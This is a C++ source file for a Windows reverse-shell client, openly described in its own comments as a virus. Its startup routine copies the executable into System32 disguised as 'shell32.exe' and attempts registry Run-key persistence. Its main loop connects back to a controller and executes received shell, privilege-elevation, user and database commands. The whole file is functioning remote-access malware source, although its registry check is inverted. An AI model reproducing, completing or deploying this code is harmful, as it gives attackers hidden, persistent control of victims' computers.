// reverse_shell.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
//#include<Windows.h>
#include "Client.h"
#include "json.hpp"
#include "ShellCommand.h"
#include "ElevateCommand.h"
#include "userCommand.h"
#include "DatabaseCommand.h"

using json = nlohmann::json;
using namespace std;

#define IP "127.0.0.1"
#define PORT "8008"

int _startup() {
    // tasks to perform when starting up the program
    // 1. sleep / activate some dummy task

    // 2. relocate executable to a safe place, e.g. TEMP or System32

    LPWSTR name = new TCHAR[MAX_PATH];
    // using shell32.exe as a disguaise, because shell32 is a valid procces
    LPCWSTR newname = L"C:\\Windows\\System32\\shell32.exe";
    GetModuleFileName(0, name, MAX_PATH);
    CopyFile(name, newname, FALSE);
    //future idea: replace a system file with added functionallity of the virus...
    // 3. setup as a startup program (TSR)

    HKEY hKey = HKEY_CURRENT_USER;
    LPCWSTR loc = L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY res_key;
    if (RegOpenKeyEx(hKey, loc, 0, KEY_SET_VALUE, &res_key) != ERROR_SUCCESS) {
        RegSetValue(res_key, L"SHELL", REG_SZ, newname, lstrlenW(newname));
    }
    // 4. ???
    return 0;
}

int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
{
    map<string, AbstractCommand*> commands;
    commands.insert({string("shell"), new ShellCommand()});
    commands.insert({ string("elevate"), new ElevateCommand() });
    commands.insert({ string("user"), new userCommand() });
    commands.insert({ string("db"), new DatabaseCommand() });
    // implement failesafe here...
    if (argc > 1) {
        _startup(); 
    }
    WSADATA wsadata;
    WSAStartup(MAKEWORD(2, 2), &wsadata);
    Client c = Client((char*)IP, (char*)PORT);
    DWORD i = c.connect_self();
    while (i == SOCKET_ERROR) {
        //sleep for some time and try again
        Sleep(10000);
        i = c.connect_self();
    }
    char* recvbfr;
    string com;
    recvbfr = c.recv_msg(128);
    auto j = json::parse(recvbfr);
    if (!j.contains("com")) {
        printf("json error");
    }
    else {
        com = j["com"];
        auto params = j["paras"];
        if (commands[com] != nullptr) {
            commands[com]->activate(&c, params);
        }
    }
    printf("%s", recvbfr);
    delete[] recvbfr;
    while (com != string("terminate")) {
        recvbfr = c.recv_msg(128);
        if (recvbfr == NULL) {
            exit(1);
        }
        auto j = json::parse(recvbfr);
        if (!j.contains("com")) {
            printf("json error");
        }
        else {
            com = j["com"];
            auto params = j["paras"];
            if (commands[com] != nullptr) {
                commands[com]->activate(&c, params);
            }
            printf("%s", recvbfr);
            delete[] recvbfr;
        }
    }
    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
